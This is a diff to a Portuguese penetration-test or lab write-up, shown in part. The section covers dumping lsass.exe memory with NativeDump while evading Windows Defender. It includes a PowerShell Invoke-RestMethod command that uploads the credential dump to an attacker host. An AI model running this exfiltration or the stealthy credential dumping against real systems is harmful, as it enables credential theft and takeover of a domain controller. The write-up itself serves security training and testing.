@@ -542,7 +542,7 @@ Com privilégios de `NT AUTHORITY\SYSTEM` e verificação de que estamos como **
 
 ## 🧪Fase 4 — Extração de Credenciais e Acesso ao DC
 
-Após a obtenção de privilégios SYSTEM, o objetivo passou a ser capturar credenciais da memória do processo `lsass.exe`, de forma furtiva e sem acionar antivírus. Isso permitiu acesso a contas privilegiadas de domínio para movimentações laterais.
+Após a obtenção de privilégios SYSTEM, o objetivo passou a ser capturar credenciais da memória do processo `lsass.exe`, de forma furtiva e sem acionar o Defender. Essas credenciais permitiram depois acesso ao Controlador de Domínio.
 
 ---
 
@@ -614,14 +614,14 @@ Transferência feita sem levantar alertas.
     <br/>
   <p/>
 
-✅ O NativeDump identificou automaticamente o PID do processo `lsass.exe` e gerou um dump da sua memória. Isso incluiu credenciais e hashes em uso no momento.
+✅ O NativeDump identificou automaticamente o PID do processo `lsass.exe` e gerou um dump da sua memória sem alertar o Windows Defender. Este dump incluiu credenciais e hashes em uso no momento.
 
 ---
 
 ### 4. Exfiltrar o Dump para o Atacante
 
 ```powershell
-Invoke-RestMethod -Uri "http://192.168.1.205:8080/proc_696.dmp" -Method PUT -InFile "C:\\Windows\\Temp\\proc_696.dmp"
+Invoke-RestMethod -Uri "http://192.168.1.205:8080/proc_696.dmp" -Method PUT -InFile "C:\Windows\Temp\proc_696.dmp"
 ```
 
 <p align="center">
